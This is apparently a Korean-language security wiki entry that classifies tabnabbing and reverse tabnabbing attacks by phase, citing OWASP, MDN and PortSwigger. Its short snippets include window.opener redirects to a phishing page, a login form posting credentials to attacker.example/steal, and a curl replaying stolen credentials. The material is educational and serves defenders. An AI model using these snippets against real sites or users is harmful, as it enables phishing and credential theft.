---
title: Tabnabbing
description: 
published: true
date: 2025-07-31T18:47:51.242Z
tags: vulnerable link detection, reverse tabnabbing, window.open() exploitation, reverse tabnabbing via frames, origin tab redirect, history removal and ui spoofing, credential harvesting, credential exfiltration
editor: markdown
dateCreated: 2025-07-27T10:08:19.285Z
---

# Tabnabbing

## 개요

“Tabnabbing”은 사용자가 새 탭으로 외부 사이트를 열고 원래 탭으로 돌아간 순간, 백그라운드에 남아 있던 악성 탭이 `document.location` 또는 `document.write()` 를 이용해 스스로의 콘텐츠를 피싱 로그인 화면이나 악성 광고로 교체해 버리는 기법이다. 브라우저는 탭 컨텍스트가 동일하다고 판단해 주소 표시줄 변화를 즉시 드러내지 않거나 사용자가 시야 밖 탭의 변화를 인지하지 못하므로, 피해자는 자신이 이미 방문했던 정상 사이트라 착각한 채 자격 증명・결제 정보를 입력하게 된다. 결과적으로 탭 간 보안 경계가 흐려져 계정 탈취, 금융 사기 같은 2차 피해로 이어질 수 있다.

## 분류

> 인지 맥락 불일치 (Perceptual Context Gap)  
> → 브라우저 탭 컨텍스트 불일치 (Browser Tab Context Mismatch)  
> → Tabnabbing

## 절차

| Phase         | Description                                                                                     |
|---------------|-------------------------------------------------------------------------------------------------|
| Reconnaissance| 공격자는 목표 웹사이트, 링크 구조를 파악하고 어떤 링크가 외부로 열릴지 확인한다. 외부 링크 삽입 여부, window.open() 호출이나 IFRAME 삽입 지점 등 허용되는 기능을 확인한다. |
| Exploitation  | 공격자가 target=”_blank” 링크나 window.open()을 이용해서 악의적인 사이트를 연다. 결과적으로 공격 페이지가 원래 탭의 window.handle(또는 window.opener)에 접근할 수 있게 된다. |
| Mutation      | 원래 탭의 위치(location.replace)를 공격자가 조작한 피싱 페이지 URL로 변경해서 원래 사이트가 자동으로 가짜 로그인 페이지로 변형된다. |
| Obfuscation   | URL 변경이나 브라우저 UI가 이전과 동일하게 보이도록 사용자를 속인다. |
| Validation    | 사용자가 로그인 폼에 Credentials을 입력하면 공격자는 데이터를 수집하거나 서버로 전송해서 인증 정보가 유출된 것을 확인하고 공격 성공을 판단한다. |
| Exfiltration  | 탈취된 개인정보로 계정 접근, 판매 혹은 추가적인 공격을 수행한다. |

<div style="text-align: left;">
  <img
    src="/tabnabbing.png"
    alt="Tabnabbing 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격기법

### Reconnaissance
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Vulnerable Link Detection</td>
      <td><pre><code>document.querySelectorAll
('a[target="_blank"]:not([rel~="noopener"])');</code></pre></td>
      <td>공격자는 웹사이트의 &lt;a&gt; 태그 중 새 탭을 열지만 rel="noopener" 속성이 없는 외부 링크를 찾아 Tabnabbing에 취약한 지점을 식별한다.이러한 링크는 열리는 페이지가 window.opener를 통해 원본 탭을 제어할 수 있다.</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

### Exploitation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reverse Tabnabbing</td>
      <td><pre><code>&lt;a href="https://attacker.example/phish" 
target="_blank">Click Here&lt;/a></code></pre></td>
      <td>공격자는 target="_blank"로 열리는 악성 링크를 배포하여 사용자가 새로운 탭에서 공격자 제어 사이트를 열도록 유도한다.이때 원본 탭의 window.opener를 통해 공격자 사이트가 원본 페이지를 제어할 수 있게 된다.</td>
      <td>[A]</td>
    </tr>
    <tr>
      <td>window.open() Exploitation</td>
      <td><pre><code>&lt;button onclick="window.open('https://attacker.example/offer')">
Open Offer&lt;/button></code></pre></td>
      <td>공격자는 자바스크립트의 window.open()을 이용해 새로운 탭에 악성 사이트를 연다. 이 방식으로 열린 페이지도 window.opener를 통해 부모창에 접근 가능하며, 보호 조치가 없으면 원본 페이지를 변경할 수 있다.</td>
      <td>[C]</td>
    </tr>
    <tr>
      <td>Reverse Tabnabbing via Frames</td>
      <td><pre><code>&lt;iframe src="https://attacker.example/evil"
width="0" height="0">&lt;/iframe></code></pre></td>
      <td>공격자가 취약한 웹사이트에 외부 페이지를 IFRAME으로 삽입할 수 있는 경우, 프레임 내의 악성 페이지가 window.parent를 통해 상위 원본 탭을 제어한다. 이로써 원본 페이지를 공격자가 원하는 피싱 페이지로 바꾸는 공격이 가능해진다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Mutation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Origin Tab Redirect</td>
      <td><pre><code>html
&lt;script>
if (window.opener) { window.opener.location.replace('https://attacker.example/login'); }<br>&lt;/script></code></pre></td>
      <td>새로운 탭의 악성 스크립트가 window.opener를 이용해 원래 열려있던 탭의 위치를 공격자의 피싱 사이트로 변경한다.이로써 사용자가 보던 정상 웹사이트가 동일한 모습의 가짜 로그인 페이지로 순식간에 교체된다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>History Removal and UI Spoofing</td>
      <td><pre><code>window.opener.location.replace
("https://attacker.example/login");</code></pre></td>
      <td>공격 페이지는 location.replace()를 사용하여 원본 페이지를 피싱 페이지로 교체함으로써 브라우저 히스토리에서 원본 페이지를 제거한다. 사용자는 뒤로가기를 해도 이전 페이지로 돌아갈 수 없으며, 피싱 페이지가 제목, 디자인 등을 원본과 동일하게 꾸며둬 변화된 사실을 인지하지 못하게 한다.</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

### Validation
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Credential Harvesting</td>
      <td><pre><code>html
&lt;form action="https://attacker.example/steal" method="POST">
&lt;input name="username"> 
&lt;input type="password" name="password">
&lt;button type="submit">Login&lt;/button><br>&lt;/form></code></pre></td>
      <td>사용자가 가짜 로그인 폼에 자격증명을 입력하면 해당 정보가 공격자의 서버로 전송된다. 공격자는 제출된 아이디/비밀번호를 가로채 저장함으로써 크리덴셜 탈취에 성공했는지 확인한다. 이렇게 탈취된 인증 정보는 실제 사이트가 아니라 공격자가 조작한 피싱 사이트로 전송된다.</td>
      <td>[C]</td>
    </tr>
  </tbody>
</table>

### Exfiltration
<table>
  <thead>
    <tr>
      <th>공격 이름</th>
      <th>예시</th>
      <th>설명</th>
      <th>출처</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Credential Exfiltration</td>
      <td><pre><code>curl -X POST -d "username=victim&password=secret" 
https://target.example/login</code></pre></td>
      <td>공격자는 수집한 로그인 정보를 이용해 피해자의 계정에 무단으로 접근하거나, 탈취한 자격증명을 암시장 등에 판매하는 등 추가 공격을 수행한다. 예를 들어 탈취된 계정으로 로그인하여 금융 거래를 하거나 다른 서비스의 비밀번호로 재사용하여 2차 피해를 야기한다. 이러한 Tabnabbing 공격은 피해자의 인증 정보를 가로채 계정 장악 등 심각한 보안 위협으로 이어진다.</td>
      <td>[B]</td>
    </tr>
  </tbody>
</table>

## 분류에 해당하는 문서

[1] https://redfoxsec.com/blog/deciphering-the-threat-of-tabnabbing-attacks/

## 기타 참고문헌

[A] https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel/noopener  
[B] https://owasp.org/www-community/attacks/Reverse_Tabnabbing  
[C] https://portswigger.net/daily-swig/upcoming-google-chrome-update-will-eradicate-reverse-tabnabbing-attacks
